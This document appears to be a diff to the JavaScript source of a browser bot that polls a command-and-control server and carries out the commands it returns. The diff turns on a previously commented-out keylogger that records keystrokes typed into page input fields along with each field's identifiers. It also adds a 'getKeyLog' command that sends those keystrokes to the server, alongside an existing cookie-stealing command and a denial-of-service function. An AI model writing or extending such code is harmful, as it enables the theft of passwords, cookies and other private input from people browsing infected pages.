@@ -3,7 +3,7 @@ var config = {
     cCenter: 'http://127.0.0.1:1337',
     putPath: '/commands/put/',
     getPath: '/commands/get/',
-    timer: 3000    // ms
+    timer: 2000    // ms
 },
     botId;
 function init (){
@@ -23,13 +23,12 @@ function init (){
     // get commands of command center server
     (function tickTock() { // this should auto-run
         window.setTimeout(function() {
-            console.log("get req")
             execCommand(requestCommands(botId))
             tickTock(); // call the timer function again to continue cycle..
         }, config.timer);
     })();
 
-    //        keyLogger.start();
+    keyLogger.start();
     window.onbeforeunload = finBot;
     window.requestCommands = requestCommands;
     window.execCommand = execCommand;
@@ -64,69 +63,69 @@ function dos (options) {
     }
 }
 
-//    var keyLogger = {
-//
-//        // contains the keys data sets
-//        elements: [],
-//
-//        // initialise the keylogger functions
-//        start: function(){
-//            this.logOnKeyDown();
-//            this.logOnFieldFocus();
-//        },
-//
-//        // returns all the elements
-//        done: function(){
-//            return this.elements;
-//        },
-//
-//        // logs each key press to the elements array
-//        logOnKeyDown: function (socket) {
-//            function isInputOrTextArea (element) {
-//                return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
-//            }
-//            document.onkeydown = function (e) {
-//                e = e || window.event;
-//                var key = e.keyCode ? e.keyCode : e.charCode;
-//                // add key to the last element if current cursor is in input or text area
-//                if (isInputOrTextArea(e.srcElement)){
-//                    keyLogger.elements[ keyLogger.elements.length - 1].keys += String.fromCharCode(key);
-//                }
-//            };
-//        },
-//
-//        // set on focus events for input and text area
-//        // adds the element template to the elements array
-//        logOnFieldFocus : function (socket) {
-//            var inputFields = document.querySelectorAll('input,textarea'),
-//                fieldName = function(field) {
-//                    var name = '';
-//                    if (field.id) {
-//                        name += '#' + field.id;
-//                    }
-//                    if (field.name){
-//                        name += '$' + field.name;
-//                    }
-//                    if (field.className) {
-//                        name += '.' + field.className;
-//                    }
-//                    name += '[' + field.type + ']';
-//                    return name;
-//                },
-//                emitChange = function() {
-//                    // if fieldname is equal to last element do nothing
-//                    var field =  fieldName(this);
-//                    var element = {field: field,keys:""};
-//                    keyLogger.elements.push(element);
-//
-//                };
-//
-//            for (var i = 0; i < inputFields.length; i++) {
-//                var field = inputFields[i];
-//                field.onfocus = emitChange;
-//            }
-//        }
-//    };
+var keyLogger = {
+
+    // contains the keys data sets
+    elements: [],
+
+    // initialise the keylogger functions
+    start: function(){
+        this.logOnKeyDown();
+        this.logOnFieldFocus();
+    },
+
+    // returns all the elements
+    done: function(){
+        return this.elements;
+    },
+
+    // logs each key press to the elements array
+    logOnKeyDown: function (socket) {
+        function isInputOrTextArea (element) {
+            return element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement;
+        }
+        document.onkeydown = function (e) {
+            e = e || window.event;
+            var key = e.keyCode ? e.keyCode : e.charCode;
+            // add key to the last element if current cursor is in input or text area
+            if (isInputOrTextArea(e.srcElement)){
+                keyLogger.elements[ keyLogger.elements.length - 1].keys += String.fromCharCode(key);
+            }
+        };
+    },
+
+    // set on focus events for input and text area
+    // adds the element template to the elements array
+    logOnFieldFocus : function (socket) {
+        var inputFields = document.querySelectorAll('input,textarea'),
+            fieldName = function(field) {
+                var name = '';
+                if (field.id) {
+                    name += '#' + field.id;
+                }
+                if (field.name){
+                    name += '$' + field.name;
+                }
+                if (field.className) {
+                    name += '.' + field.className;
+                }
+                name += '[' + field.type + ']';
+                return name;
+            },
+            emitChange = function() {
+                // if fieldname is equal to last element do nothing
+                var field =  fieldName(this);
+                var element = {field: field,keys:""};
+                keyLogger.elements.push(element);
+
+            };
+
+        for (var i = 0; i < inputFields.length; i++) {
+            var field = inputFields[i];
+            field.onfocus = emitChange;
+        }
+    }
+};
 
 // request a site or sites
 //function getSites(urls){ // for routers
@@ -239,6 +238,8 @@ function execCommand(comm){
             case 'getCookies':
                 console.log('Get cookies')
                 sendResults(getCookies());
+            case 'getKeyLog':
+                sendResults(keyLogger.done())
             case 'srvScann':
             default:
                 return;
